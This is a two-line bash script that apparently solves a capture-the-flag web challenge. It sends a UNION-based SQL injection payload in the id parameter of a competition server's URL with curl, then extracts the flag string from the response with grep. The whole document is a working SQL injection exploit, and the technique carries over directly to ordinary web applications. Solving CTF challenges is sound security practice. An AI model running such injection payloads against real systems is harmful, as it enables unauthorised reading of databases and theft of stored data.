#!/bin/bash

curl -s https://quotedb-web.2021.ctfcompetition.com/?id=50%20UNION%20SELECT%20*,0%20FROM%20flag | grep -o 'CTF{.*}'
